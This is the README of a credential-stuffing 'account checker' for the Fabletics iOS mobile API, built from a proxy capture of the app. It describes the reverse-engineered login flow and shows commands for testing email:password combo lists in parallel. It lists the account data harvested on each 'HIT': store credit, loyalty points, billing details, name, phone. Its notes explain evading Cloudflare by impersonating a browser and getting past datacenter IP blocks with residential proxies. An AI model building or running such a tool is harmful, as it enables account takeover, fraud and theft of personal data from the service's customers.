# Fabletics Checker

Account checker for **app.fabletics.com** (Fabletics iOS mobile API), built from a Charles Proxy capture of the app.

## What it captures

On a valid login (`HIT`), the checker pulls:

| Category | Fields |
|----------|--------|
| **Loyalty / points** | Tier (e.g. Black), point balance, tier points, redeemed/expired points, redemption credits |
| **Membership** | Status, monthly price, next billing date, billing period, skip/due flags, member credits (tokens) |
| **Credits / rewards** | Store credit balance, membership store credit, active bounceback/endowment rewards |
| **Account** | Name, email, phone, VIP lifetime savings, days since last order, member since dates |
| **Activity** | Cart item count, wishlist count |

## API flow

Reverse-engineered from the `.chlz` capture:

1. `GET /api/sessions` — obtain guest JWT from the `Authorization` response header
2. `POST /api/auth/login` — exchange `email:password` for an access token (guest JWT required)
3. Parallel account fetches:
   - `/api/accounts/me/profile`
   - `/api/accounts/me/loyalty/details`
   - `/api/accounts/me/membership`
   - `/api/accounts/me/membership/period`
   - `/api/accounts/me/endowment/history`
   - `/api/cart/items/count`
   - `/api/accounts/me/wishlist/ids`

## Install

```bash
pip install -r requirements.txt
```

## Usage

Single combo:

```bash
python -m fabletics "email@example.com:password"
```

Combo file:

```bash
python -m fabletics -f combos.txt -t 5 -o hits.txt
```

Proxy defaults to the configured Evomi residential US proxy. Override or disable:

```bash
python -m fabletics "email@example.com:password" --proxy host:port:user:pass
python -m fabletics "email@example.com:password" --no-proxy
```

JSON output:

```bash
python -m fabletics "email@example.com:password" --json
```

## Result statuses

- `HIT` — valid login, account data captured
- `FAIL` — invalid credentials
- `RETRY` — rate limit / server error (exit code 2)
- `ERROR` — unexpected failure

## Notes

- Uses `curl_cffi` with Safari iOS impersonation to pass Cloudflare.
- Residential proxy is enabled by default (Evomi US). Use `--no-proxy` for direct connection.
- The login endpoint blocks datacenter IPs without a proxy.
- Mobile API key and app version are embedded from the capture (`fabletics/config.py`).
